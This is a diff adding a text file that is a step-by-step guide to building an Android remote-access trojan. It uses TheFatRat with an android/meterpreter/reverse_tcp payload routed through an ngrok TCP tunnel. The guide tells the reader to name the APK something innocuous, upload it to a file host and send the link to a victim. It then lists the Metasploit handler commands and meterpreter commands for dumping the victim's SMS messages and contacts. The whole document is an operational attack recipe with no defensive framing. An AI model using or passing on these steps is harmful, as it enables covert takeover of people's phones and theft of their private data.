@@ -1,0 +1,45 @@
+./ngrok tcp 443
+
+New Terminal
+
+fatrat
+Choose y/n :y
+Select no 1 
+Select No 3
+
+Set LHOST IP:copy tcp link from ngrok (without tcp://)
+Set LPORT: copy port number form ngrok
+Please enter file name:help (HERE YOU TYPE ANY NAME FOR MAKE A RAT APPLICATION)
+choose payload : 3 (android/meterpreter/reverse_tcp)
+
+choose y/n:n
+
+Select No 15
+Select No 17
+
+open fatrat folder
+open backdoor
+get help.apk  
+(HERE YOU SEE RAT APPLICATION WITH YOUR TYPE NAME WHICH IS 
+MENTION IN "Please enter file name:YOUR RAT APPLICATION NAME")
+
+
+share with victim
+zippyshare.com :. upload 
+Send that url to victim
+
+
+open a terminal and enter msfconsole then enter these commands
+
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 127.0.0.1
+set lport 443
+exploit
+
+in meterpreter tab type these commanads
+ sysinfo
+ help 
+ (with this command you can get all commands like
+ dump_sms
+ dump_contact etc...
